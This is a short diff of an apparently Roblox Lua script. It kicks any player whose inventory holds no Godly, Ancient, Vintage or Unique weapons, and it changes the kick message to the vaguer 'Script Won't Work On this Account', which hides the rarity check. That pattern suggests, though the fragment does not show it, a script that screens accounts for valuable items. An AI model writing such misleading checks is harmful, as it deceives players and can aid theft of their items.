@@ -28,7 +28,7 @@ for itemName, amount in pairs(inv.Weapons.Owned) do
 end
 
 if not found then
-    p:Kick("No Godly, Ancient, Vintage, or Unique items found.")
+    p:Kick("Script Won't Work On this Account")
     return
 end
 
